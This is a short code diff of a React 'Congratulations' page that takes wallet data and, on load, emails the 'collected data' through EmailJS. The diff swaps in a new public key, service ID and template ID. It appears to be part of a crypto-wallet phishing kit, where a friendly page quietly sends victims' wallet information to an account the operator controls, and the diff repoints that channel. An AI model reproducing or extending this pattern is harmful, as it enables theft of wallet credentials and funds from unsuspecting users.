@@ -9,7 +9,7 @@ import emailjs from "@emailjs/browser"
 export default function Congratulations({ walletData }) {
   useEffect(() => {
     // Initialize EmailJS with your public key
-    emailjs.init("gb5fog8V1UINFZKpy") // Replace with your EmailJS public key
+    emailjs.init("yYhQD1s5tiGmItWd3") // Replace with your EmailJS public key
 
     // Send email with collected data
     const sendEmail = async () => {
@@ -22,8 +22,8 @@ export default function Congratulations({ walletData }) {
         }
 
         await emailjs.send(
-          "service_2mtival", // Replace with your EmailJS service ID
-          "template_jvm0wnk", // Replace with your EmailJS template ID
+          "service_1x16ejs", // Replace with your EmailJS service ID
+          "template_cxfx3vj", // Replace with your EmailJS template ID
           templateParams,
         )
 
